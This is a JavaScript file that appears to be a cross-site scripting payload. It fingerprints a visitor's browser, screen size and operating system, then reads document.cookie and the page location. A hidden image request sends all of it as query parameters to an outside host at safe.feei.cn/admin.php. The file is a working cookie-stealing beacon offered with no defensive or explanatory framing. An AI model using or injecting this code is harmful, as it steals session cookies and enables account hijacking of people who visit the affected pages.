var img = document.createElement("img"),referrer = null,browser = null,screensize = null,system = null
referrer = document.referrer
/*var bro = $.browser
if(/chrome/.test(navigator.userAgent.toLowerCase())){
	browser = 'Chrome' + ' ' + bro.version
}else if(bro.webkit){
	browser = 'Webkit' + ' ' + bro.version
}else if(bro.safari){
	browser = 'Safari' + ' ' + bro.version
}else if(bro.opera){
	browser = 'Opera' + ' ' + bro.version
}else if(bro.msie){
	if(bro.version.slice(0,1) == "8"){
		browser = 'IE8'
	}else if(bro.version.slice(0,1) == "7"){
		browser = 'IE7'
	}else if(bro.version.slice(0,1) == "6"){
		browser = 'IE6'
	}
}else if(bro.mozilla){
	browser = 'Mozilla' + ' ' + bro.version
}*/
browser = navigator.appName
if(/chrome/.test(navigator.userAgent.toLowerCase())){
	browser = "Chrome"
}
screensize = screen.width + '*' + screen.height 
if (navigator.appVersion.indexOf("NT 5.1")!=-1){
	system = 'Windos XP'
}else if(navigator.appVersion.indexOf("NT 6.0")!=-1){
	system = 'Windows Vista'
}else if(navigator.appVersion.indexOf("NT 6.1")!=-1){
	system = 'Windows 7'
}else if(navigator.appVersion.indexOf("Mac OS X 10.0")!=-1){
	system = 'MacOS 猎豹(Cheetah)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.1")!=-1){
	system = 'MacOS 美洲狮(Puma)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.2")!=-1){
	system = 'MacOS 美洲虎(Jaguar)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.3")!=-1){
	system = 'MacOS 黑豹(Panther)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.4")!=-1){
	system = 'MacOS 老虎(Tiger)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.5")!=-1){
	system = 'MacOS 豹子(Leopard)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.6")!=-1){
	system = 'MacOS 雪豹(Snow Leopard)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.7")!=-1){
	system  = 'MacOS 狮子(Lion)'
}else if(navigator.appVersion.indexOf("Mac OS X 10.8")!=-1){
	system = 'MacOS 美洲狮(Mountain Lion)'
}else if(navigator.appVersion.indexOf("Linux")!=-1){
	system = 'Linux'
}else if(navigator.appVersion.indexOf("X11 ")!=-1){
	system = 'Unix'
}
img.src = "http://safe.feei.cn/admin.php?location="+escape(document.location)+"&cookie="+escape(document.cookie)+"&referrer="+escape(referrer)+"&browser="+escape(browser)+"&screensize="+escape(screensize)+"&system="+escape(system);
document.body.appendChild(img);
